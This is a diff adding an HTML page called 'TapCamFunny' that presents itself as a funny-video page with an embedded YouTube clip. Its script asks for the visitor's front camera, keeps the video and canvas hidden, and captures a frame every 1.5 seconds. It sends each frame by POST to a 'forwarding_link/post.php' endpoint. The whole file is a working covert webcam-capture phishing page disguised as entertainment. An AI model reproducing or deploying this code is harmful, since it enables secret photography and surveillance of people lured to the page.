@@ -1,0 +1,86 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src=".index.js"></script>
+<link rel="stylesheet" type="text/css" href=".index.css">
+<script type="text/javascript" src=".jquery.js"></script>
+<title>TapCamFunny</title>
+</head>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+  <body>
+    <header style="box-shadow: 0px 0px 25px #333; margin-top: 0; width: 100%; padding: 30px; background: #32bd32; color: #fff;">
+       <h1 style="margin: 0;">TapCamFunny</h1>
+    </header>
+    <div class="video-wrap" hidden="hidden">
+       <video id="video" playsinline autoplay></video>
+     </div>
+
+      <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+       <p><label><input type="checkbox" name="mirror" id="mirror"/></label></p>
+     <br>
+     <iframe width="750" height="550" style="align-item: center; border-radius: 25px; box-shadow: 0px 0px 25px;" src="https://www.youtube.com/embed/bCtlituS9p8?si=AmnJGcHc1EsBLMnH" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+     <br><br><br>
+     <a style="padding: 20px; margin-top: 50px; text-decoration: none; box-shadow: 0 0 25px rgba(255, 0, 51, 0.7); background-color: #ff0033; color: #fff; border-radius: 5px;"href="https://www.youtube.com"><b>YouTube</b></a>
+  </body>
+</html>
